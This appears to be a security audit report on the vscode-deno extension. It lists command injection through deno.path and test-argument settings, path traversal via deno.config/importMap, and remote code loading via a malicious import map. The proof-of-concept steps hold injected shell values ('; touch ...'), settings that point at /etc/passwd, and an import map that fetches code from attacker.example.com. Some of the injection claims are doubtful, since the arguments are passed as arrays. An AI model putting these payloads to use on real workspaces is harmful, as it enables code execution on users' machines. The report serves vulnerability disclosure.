## Combined Vulnerability List

### 1. Command Injection via `deno.path` Setting

- **Vulnerability Name:** Command Injection via `deno.path` Setting
- **Description:**
    1. A malicious user gains access to the VS Code settings (either user settings or workspace settings).
    2. The attacker modifies the `deno.path` setting within the VS Code settings to include malicious shell commands. For example, they might set it to: `deno ; malicious_command`.
    3. When the VS Code extension needs to execute the Deno CLI for various features such as type checking, linting, formatting, debugging, or running tasks, it retrieves the path from the `deno.path` setting.
    4. Due to the lack of proper sanitization of the `deno.path` setting, the system shell interprets the injected malicious commands along with the intended Deno command.
    5. Consequently, the malicious commands are executed on the user's system with the same privileges as the VS Code process.
- **Impact:**
    Arbitrary code execution on the user's machine. This can lead to severe consequences, including:
    - Data theft and exfiltration.
    - Installation of malware (viruses, ransomware, etc.).
    - System compromise and unauthorized access.
    - Privilege escalation.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    None. The code directly uses the user-provided `deno.path` setting without any sanitization or validation.
- **Missing Mitigations:**
    - Input sanitization: The extension should sanitize the `deno.path` setting to ensure it only contains a valid file path and does not include any shell metacharacters or command separators (like `;`, `&`, `|`, etc.).
    - Safe command execution: Instead of directly passing the `deno.path` setting to a shell, the extension should use a safer method like `child_process.spawn` in Node.js. This involves separating the command and its arguments, preventing shell interpretation of injected commands.
- **Preconditions:**
    - The victim must have the "vscode-deno" extension installed in VS Code.
    - An attacker needs to be able to modify the VS Code settings, either user settings or workspace settings. This could be achieved through social engineering, supply chain attacks, or if the attacker has compromised the user's machine already.
- **Source Code Analysis:**
    - File: `client\src\util.ts`
    - Function: `getDenoCommandName()` and `getDenoCommandPath()`
    - Step-by-step analysis:
        1. The `getDenoCommandPath()` function is responsible for determining the path to the Deno executable.
        2. It first attempts to retrieve the path configured in the VS Code settings under `deno.path` using `getWorkspaceConfigDenoExePath()`.
        3. If a path is provided in the settings, `getDenoCommandPath()` checks if it's an absolute path. If it's relative, it tries to resolve it relative to the workspace folders.
        4. The resolved or configured path (if absolute) is then returned without any sanitization.
        5. Functions like `buildDenoTask` in `client\src\tasks.ts` and `DenoDebugConfigurationProvider` in `client\src\debug_config_provider.ts` use `getDenoCommandName()` to get the Deno command.
        6. These functions then use `vscode.ProcessExecution` to execute Deno commands, directly using the unsanitized path obtained from `getDenoCommandName()`.
    - Visualization:
      ```
      User Settings (deno.path) --> getWorkspaceConfigDenoExePath() --> getDenoCommandPath() --> getDenoCommandName() --> vscode.ProcessExecution --> System Shell --> Command Execution (Vulnerability)
      ```
- **Security Test Case:**
    1. Open Visual Studio Code with the "vscode-deno" extension installed and activated.
    2. Access VS Code settings (File -> Preferences -> Settings or Code -> Settings -> Settings on macOS).
    3. In the settings search bar, type "deno.path".
    4. Edit the `Deno › Path` setting and set its value to: `deno ; touch /tmp/pwned`. This injects a command to create a file `/tmp/pwned` after the deno command.
    5. Open any TypeScript or JavaScript project folder in VS Code.
    6. Enable Deno for the workspace if it's not already enabled. You can use the command palette (Ctrl+Shift+P or Cmd+Shift+P) and run "Deno: Enable".
    7. Trigger any feature of the Deno extension that would execute the Deno CLI. For example:
        - Open a TypeScript file within the workspace.
        - Use the command palette and run "Deno: Cache Active Document".
    8. After triggering a Deno extension feature, check if the file `/tmp/pwned` has been created in the `/tmp` directory.

### 2. Path Traversal via `deno.config` and `deno.importMap` settings

- **Vulnerability Name:** Path Traversal via `deno.config` and `deno.importMap` settings
- **Description:**
    1. An attacker crafts a malicious Visual Studio Code workspace.
    2. The attacker creates a `settings.json` file within the `.vscode` folder of the malicious workspace.
    3. In the `settings.json`, the attacker sets either the `deno.config` or `deno.importMap` setting to an absolute file path pointing outside the intended workspace directory. For example, on Linux, this could be set to `/etc/passwd`, or on Windows, to `C:\Windows\win.ini`.
    4. The victim user opens this malicious workspace in Visual Studio Code with the Deno extension installed and enabled.
    5. When the Deno extension initializes or performs operations that utilize these configuration settings, it passes the attacker-controlled file path directly to the Deno CLI as a command-line argument (e.g., using `--config` or `--import-map`).
    6. The Deno CLI, executed by the extension, attempts to access and process the file specified by the attacker-controlled path, potentially leading to reading files outside the intended workspace scope.

- **Impact:**
    - **Information Disclosure:** A successful path traversal can allow an attacker to read sensitive files from the victim's file system that the Deno process has permissions to access.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The extension directly passes the configured paths to the Deno CLI without validation or sanitization.

- **Missing Mitigations:**
    - **Path Validation:** The extension should validate the paths provided in the `deno.config` and `deno.importMap` settings. It should ensure that these paths are within the workspace directory or within a set of explicitly allowed directories.
    - **Path Sanitization:**  Before passing the paths to the Deno CLI, the extension should sanitize them to prevent any path traversal attempts. This could involve resolving paths to their canonical form and verifying they remain within the allowed boundaries.

- **Preconditions:**
    - The victim user must have the `vscode-deno` extension installed and enabled.
    - The victim user must open a malicious workspace provided by the attacker.
    - The malicious workspace must contain a `.vscode/settings.json` file that sets either `deno.config` or `deno.importMap` to a path outside the workspace.
    - The `deno.enable` setting must be set to `true` for the workspace or globally.

- **Source Code Analysis:**
    - **`client\src\debug_config_provider.ts`:**
        ```typescript
        #getAdditionalRuntimeArgs() {
            const args: string[] = [];
            const settings = this.#extensionContext.clientOptions
              .initializationOptions();
            if (settings.importMap) {
              args.push("--import-map");
              args.push(settings.importMap.trim()); // Attacker-controlled path from settings.json
            }
            if (settings.config) {
              args.push("--config");
              args.push(settings.config.trim()); // Attacker-controlled path from settings.json
            }
            return args;
          }
        ```

    - **`client\src\commands.ts`:**
        ```typescript
        export function startLanguageServer( ... ): Callback {
          return async () => {
            const config = vscode.workspace.getConfiguration(EXTENSION_NS);
            const serverOptions: ServerOptions = {
              run: {
                command,
                args: ["lsp"],
                options: { env },
              },
              debug: {
                command,
                args: ["lsp"],
                options: { env },
              },
            };
            const client = new LanguageClient(
              LANGUAGE_CLIENT_ID,
              LANGUAGE_CLIENT_NAME,
              serverOptions,
              {
                initializationOptions: () => {
                  const denoConfiguration = vscode.workspace.getConfiguration().get(
                    EXTENSION_NS,
                  ) as Record<string, unknown>;
                  transformDenoConfiguration(extensionContext, denoConfiguration);
                  return {
                    ...denoConfiguration, // Contains deno.config and deno.importMap from settings.json
                    javascript: vscode.workspace.getConfiguration().get("javascript"),
                    typescript: vscode.workspace.getConfiguration().get("typescript"),
                    enableBuiltinCommands: true,
                  } as object;
                },
              },
            );
          }
        ```

- **Security Test Case:**
    1. **Setup:** Ensure you have the `vscode-deno` extension installed and enabled. Create a new empty folder named `malicious-workspace`. Create `.vscode` and `settings.json` inside, and `test.ts` in the root.
    2. **Craft Malicious Settings:** In `malicious-workspace/.vscode/settings.json`, add:
        ```json
        {
            "deno.enable": true,
            "deno.config": "/etc/passwd" // Or "C:\\Windows\\win.ini"
        }
        ```
        or
        ```json
        {
            "deno.enable": true,
            "deno.importMap": "/etc/passwd" // Or "C:\\Windows\\win.ini"
        }
        ```
    3. **Trigger Vulnerability:** Open `malicious-workspace` in VS Code and open `test.ts`.
    4. **Observe (Indirectly):** Check "Deno Language Server" output for errors related to accessing the configured path. For a definitive test, use system file monitoring tools to observe file access by the `deno` process.

### 3. Arbitrary Code Execution via Malicious Deno Path Configuration

- **Vulnerability Name:** Arbitrary Code Execution via Malicious Deno Path Configuration
- **Description:**
    1. An attacker crafts a malicious workspace.
    2. The malicious workspace includes a `.vscode/settings.json` file.
    3. Inside `settings.json`, the attacker sets the `deno.path` setting to point to a malicious executable, potentially located within the workspace itself.
    4. The victim opens this malicious workspace in Visual Studio Code with the Deno extension installed and enabled.
    5. When the Deno extension initializes or attempts to use the Deno CLI, it reads the `deno.path` setting from the workspace configuration.
    6. Instead of using the legitimate Deno CLI, the extension executes the malicious executable specified in `deno.path`.
    7. The malicious executable runs with the privileges of the user who opened the workspace, leading to arbitrary code execution.
- **Impact:**
    - Arbitrary code execution on the victim's machine, leading to data theft, malware installation, or system compromise.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The extension reads and uses the `deno.path` setting without any validation or sanitization.
- **Missing Mitigations:**
    - **Executable Path Validation:** Validate the `deno.path` setting to ensure it points to a legitimate Deno executable.
    - **Executable Verification:** Verify the integrity and authenticity of the Deno executable, possibly by checking digital signatures or hashes.
    - **User Warning:** Display a warning if `deno.path` is modified in workspace settings, especially if pointing to unusual locations.
    - **Restricting `deno.path` Scope:** Consider limiting `deno.path` to user or global settings only.
- **Preconditions:**
    - The victim has the "Deno for Visual Studio Code" extension installed.
    - The victim opens a malicious workspace with a compromised `deno.path` setting in `.vscode/settings.json`.
    - The attacker needs to provide a malicious executable at the specified path.
- **Source Code Analysis:**
    1. **`client\src\util.ts:getDenoCommandPath()`**: Retrieves `deno.path` from workspace config.
    2. **`client\src\util.ts:getWorkspaceConfigDenoExePath()`**: Directly gets the `deno.path` setting string without validation.
    3. **`client\src\tasks.ts:buildDenoTask()` & `client\src\commands.ts`**: Use `getDenoCommandName()` (which calls `getDenoCommandPath()`) for process execution.
    - **Vulnerability Point:** Workspace configuration (`deno.path`) is prioritized and used directly without safety checks.
- **Security Test Case:**
    1. **Setup Malicious Executable:** Create `malicious-deno-workspace` and inside it `malicious-deno.sh` (or `.bat`) to echo a message and create a file `/tmp/pwned.txt`. Make it executable.
    2. **Create Workspace Settings:** In `malicious-deno-workspace/.vscode/settings.json`, set `"deno.path": "./malicious-deno.sh"`.
    3. **Create Dummy Deno File:** Add `test.ts` in `malicious-deno-workspace`.
    4. **Open Workspace in VSCode:** Open `malicious-deno-workspace` in VS Code with the Deno extension.
    5. **Trigger Extension Usage:** Open `test.ts` or use any Deno extension feature.
    6. **Verify Vulnerability:** Check for the message in VSCode Output and the creation of `/tmp/pwned.txt`.

### 4. Arbitrary Command Injection via Test Arguments

- **Vulnerability Name:** Arbitrary Command Injection via Test Arguments
- **Description:**
  - Attacker crafts a malicious workspace configuration.
  - In the workspace settings, the attacker sets `deno.testing.args` or `deno.codeLens.testArgs` to include malicious commands, e.g., `["--allow-all", "; malicious_command; "]`.
  - The user opens a workspace with this malicious configuration.
  - The user runs tests using the Test Explorer or Code Lens.
  - The extension executes `deno test` with attacker-injected arguments, leading to command execution.
- **Impact:** Arbitrary code execution on the user's machine.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None. Arguments from settings are used directly without sanitization.
- **Missing Mitigations:**
  - Sanitize arguments from `deno.testing.args` and `deno.codeLens.testArgs`.
  - Warn users about risks of untrusted workspace settings.
- **Preconditions:**
  - User opens a workspace with malicious `.vscode/settings.json` or workspace settings.
  - Deno extension is enabled.
  - User runs tests via Test Explorer or Code Lens.
- **Source Code Analysis:**
  - In `client\src\commands.ts`, function `test`:
    ```typescript
    export function test( ... ): Callback {
      return async (uriStr: string, name: string, options: TestCommandOptions) => {
        const config = vscode.workspace.getConfiguration(EXTENSION_NS, uri);
        const testArgs: string[] = [
          ...(config.get<string[]>("codeLens.testArgs") ?? []), // Vulnerable line for Code Lens
          ...(config.get<string[]>("testing.args") ?? []),    // Vulnerable line for Test Explorer
        ];
        const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
        const definition: tasks.DenoTaskDefinition = {
          type: tasks.TASK_TYPE,
          command: "test",
          args, // args is used directly in ProcessExecution
        };
        const task = tasks.buildDenoTask(workspaceFolder, denoCommand, definition, ...);
        await vscode.tasks.executeTask(task);
      };
    }
    ```
  - Vulnerable lines retrieve `codeLens.testArgs` and `testing.args` and use them directly in command arguments without sanitization.
- **Security Test Case:**
  - **Test case 1 (Test Explorer):**
    1. Create workspace, `test.ts` with a test.
    2. Create `.vscode/settings.json` with malicious `deno.testing.args`: `"; touch malicious_file_test_explorer.txt; "`.
    3. Open Test Explorer, run test.
    4. Verify `malicious_file_test_explorer.txt` is created.
  - **Test case 2 (Code Lens):**
    1. Repeat steps 1-2 for Code Lens with malicious `deno.codeLens.testArgs`: `"; touch malicious_file_codelens.txt; "`.
    2. Open `test.ts`, click "Run Test" code lens.
    3. Verify `malicious_file_codelens.txt` is created.

### 5. Malicious Import Map leading to Arbitrary Code Execution

- **Vulnerability Name:** Malicious Import Map leading to Arbitrary Code Execution
- **Description:**
    1. Attacker crafts a malicious `import_map.json` redirecting modules to attacker-controlled locations.
    2. Attacker creates a workspace with this malicious `import_map.json`.
    3. Victim opens the workspace in VS Code with the Deno extension enabled.
    4. Deno extension's language server reads `deno.importMap` setting.
    5. When a file with an import matching the malicious map is opened, the language server fetches the module from the attacker's server.
    6. Malicious code in the fetched module can be executed by the Deno language server.
- **Impact:** Arbitrary code execution on the user's machine.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None in the VS Code extension.
- **Missing Mitigations:**
    - Input validation in Deno Language Server for URLs in `import_map.json`.
    - Security warnings in VS Code extension for detected `import_map.json` with external redirects.
    - Sandboxing in Deno Language Server for modules loaded via import maps.
    - UI in VS Code extension to review/approve import map redirects.
- **Preconditions:**
    - VS Code Deno extension installed and enabled.
    - User opens a workspace with a malicious `import_map.json`.
    - `deno.enable` is active for the workspace.
    - A file is opened triggering module resolution using the malicious import map.
- **Source Code Analysis:**
    - `client/src/extension.ts`: `initializationOptions` passes `deno.importMap` setting to Deno Language Server.
    - Vulnerability is in Deno Language Server's handling of `import_map.json` and lack of security measures when resolving and executing modules.
- **Security Test Case:**
    1. **Attacker Setup**: Create `https://attacker.example.com/malicious_module.js` with `console.log("Malicious code from attacker.example.com executed!");`. Create `import_map.json` with redirection:
        ```json
        {
          "imports": {
            "example_module/": "https://attacker.example.com/malicious_module.js"
          }
        }
        ```
    2. **Victim Actions**: Open VS Code, install Deno extension, open workspace with `import_map.json`, enable Deno, create `test_module.ts`:
        ```typescript
        import * as maliciousModule from "example_module/";
        console.log("Test module executed, importing example_module/");
        ```
    3. **Expected Outcome**: Observe "Malicious code from attacker.example.com executed!" in "Deno Language Server" output, confirming execution of attacker's code.
